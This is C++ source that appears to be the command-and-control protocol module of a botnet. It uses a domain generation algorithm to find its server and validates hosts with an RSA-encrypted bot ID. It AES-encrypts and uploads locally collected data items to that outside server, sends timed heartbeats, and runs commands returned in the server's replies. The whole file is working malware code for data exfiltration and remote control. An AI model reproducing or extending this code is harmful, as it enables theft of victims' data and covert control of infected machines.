#include "stdafx.h"
#include "bzprotocol.h"
#include "http.h"
#include "debug.h"
#include "cryptedstrings.h"
#include "cryptedscripts.h"
#include "scriptmodule.h"
#include "string.h"
#include "kernel.h"
#include "tools.h"
#include "rsa.h"
#include "aes.h"
#include "commandmodule.h"

BOOL generateDomain(LPWSTR domain)
{
	//executeVoidScript(dga_default);
	return TRUE;
}

BzProtocol::VALIDATION_ERROR BzProtocol::validateHost(LPCWSTR host)
{
	Http::HTTP_REQUEST request;
	DWORD error;

	CSTRA(equal, http_param_equal);
	CSTRA(id, bz_protocol_param_id);
	CSTRW(path, bz_protocol_validate);

	std::wstring url = std::wstring(host).append(path);

	std::string data = std::string(id).append(equal);

	BYTE * rsaData;
	DWORD rsaDataLengthOut;

	if (!rsaCryptBE(kernelData.keys.bzpValidatePublicKey, (BYTE*)kernelData.database.header.botId, sizeof(kernelData.database.header.botId), &rsaData, &rsaDataLengthOut))
	{
		return VALIDATION_ERROR::VALIDATION_ERROR_HOST;
	}

	LPSTR b64RsaData;
	BOOL b64success = b64encodeA(rsaData, rsaDataLengthOut, &b64RsaData);

	delete rsaData;

	if (!b64success)
	{
		return VALIDATION_ERROR::VALIDATION_ERROR_HOST;
	}



	CSTRW(post, http_method_post);
	
	DWORD responseSize;
	DWORD responseCode;

	data = data.append(hexencode(std::string(b64RsaData)));
	delete b64RsaData;

	if ((error = Http::HTTPInitRequest(&request, url.c_str())) != HTTP_ERR_SUCCESS)
	{
		return VALIDATION_ERROR::VALIDATION_ERROR_HOST;
	}

	if (Http::HTTPSendRequest(&request, &responseCode, &responseSize, post, data.c_str()) != HTTP_ERR_SUCCESS)
	{
		Http::HTTPCloseRequest(&request);
		return VALIDATION_ERROR::VALIDATION_ERROR_HOST;
	}
		

	if (responseCode != 200 || responseSize != sizeof(kernelData.database.header.botId)) {
		Http::HTTPCloseRequest(&request);
		return VALIDATION_ERROR::VALIDATION_ERROR_HASH;
	}

	char response[sizeof(kernelData.database.header.botId) + 1];

	DWORD readSize;
	Http::HTTPReadRequest(&request, response, sizeof(kernelData.database.header.botId), &readSize);
	Http::HTTPCloseRequest(&request);

	if(std::string(kernelData.database.header.botId, sizeof(kernelData.database.header.botId)) != std::string(response)) return VALIDATION_ERROR::VALIDATION_ERROR_HASH;

	return VALIDATION_ERROR::VALIDATION_SUCCESS;
}

void readCommands(char * commands, long size)
{
	BYTE * data;
	DWORD dataSize;
	b64decodeA(commands, size, &data, &dataSize);
	
	if (dataSize < 1) return;

	CommandModule::addCommand((CommandModule::COMMAND_TYPE)data[0], (char *)&data[1], dataSize - 1);

	delete data;
}

BOOL BzProtocol::sendData(long dataType, BYTE * data, DWORD dataSize)
{
	Http::HTTP_REQUEST request;
	char * domainBuffer;
	BOOL hasResult;
	BOOL hasError;

	CSTRW(urlPath, bz_protocol_upload);
	
	executeScript(dga_default, (LPVOID*)&domainBuffer, &hasResult, &hasError);

	if (hasError) return FALSE;

	std::string domain(domainBuffer);
	std::wstring url = std::wstring(domain.begin(), domain.end()).append(urlPath);

	delete domainBuffer;

	int aesSize = (dataSize / 16 + 1) * 16;
	BYTE * aesData = new BYTE[aesSize];
	BYTE * dataForAes = new BYTE[aesSize];

	memcpy(dataForAes, data, dataSize);

	AES128_CBC_encrypt_buffer(aesData, dataForAes, dataSize, send_key, send_iv);

	LPSTR b64RsaData;
	BOOL base64success = b64encodeA(aesData, aesSize, &b64RsaData);
	
	delete aesData;
	delete dataForAes;
	
	if (!base64success)
	{
		return FALSE;
	}

	DWORD error;
	if ((error = Http::HTTPInitRequest(&request, url.c_str())) != HTTP_ERR_SUCCESS)
	{
		WDEBUG("Could not init request for " << domain.c_str() << " error : " << error);
		return FALSE;
	}

	CHAR typeStr[32];
	_itoa_s(dataType, typeStr, 10);

	CSTRA(paramId, bz_protocol_param_id);
	CSTRA(paramType, bz_protocol_param_data_type);
	CSTRA(paramData, bz_protocol_param_data);
	CSTRA(cEqual, http_param_equal);
	CSTRA(cSeparator, http_param_separator);
	
	std::string postData = 
		std::string(paramId).append(cEqual).append(hexencode(std::string(kernelData.database.header.botId, sizeof(kernelData.database.header.botId))))
		.append(cSeparator).append(paramType).append(cEqual).append(hexencode(std::string(typeStr)))
		.append(cSeparator).append(paramData).append(cEqual);

	if (dataType != TYPE_HEARTBEAT)
		postData = postData.append(hexencode(std::string(b64RsaData)));

	delete b64RsaData;

	CSTRW(post, http_method_post);

	DWORD responseSize;
	DWORD responseCode;

	if (Http::HTTPSendRequest(&request, &responseCode, &responseSize, post, postData.c_str()) != HTTP_ERR_SUCCESS) {
		Http::HTTPCloseRequest(&request);
		return FALSE;
	}

	if (responseCode != 200 || responseSize < 1) {
		Http::HTTPCloseRequest(&request);
		return FALSE;
	}

	char * response = new char[BZ_MAX_LENGTH];

	DWORD readSize;
	Http::HTTPReadRequest(&request, response, BZ_MAX_LENGTH - 1, &readSize);
	Http::HTTPCloseRequest(&request);

	if (readSize > 1 && response[0] == '1')
	{
		char * command = &response[1];
		readCommands(command, readSize - 1);
	}

	delete response;

	return TRUE;
}

DWORD WINAPI BzProtocol::_procHeartbeat(void * p)
{
	while (WaitForSingleObject(kernelData.globalEvents.stopEvent, BZ_HEARTBEAT_CLOCK) == WAIT_TIMEOUT)
	{
		sendData(TYPE_HEARTBEAT, NULL, NULL);
	}
	return 0;
}

DWORD WINAPI BzProtocol::_procSender(void * p)
{
	while (WaitForSingleObject(kernelData.globalEvents.stopEvent, BZ_SEND_CLOCK) == WAIT_TIMEOUT)
	{
		InfoDatabase::info_database_item_cursor_t cursor;
		InfoDatabase::firstItem(&kernelData.database, &cursor);
		if (!((cursor.currentItemHeader.flags & InfoDatabase::ITEM_FLAG_UPLOAD) || InfoDatabase::nextItemWithFlag(&kernelData.database, &cursor, InfoDatabase::ITEM_FLAG_UPLOAD))) continue;
		if (InfoDatabase::openItem(&kernelData.database, &cursor))
		{
			if (sendData(cursor.currentItemHeader.type, (BYTE *)cursor.itemData, cursor.currentItemHeader.size))
			{
				cursor.currentItemHeader.flags = cursor.currentItemHeader.flags & ~InfoDatabase::ITEM_FLAG_UPLOAD;
				InfoDatabase::saveItemHeader(&kernelData.database, &cursor);
			}
			InfoDatabase::closeItem(&cursor);
		}
	}
	return 0;
}
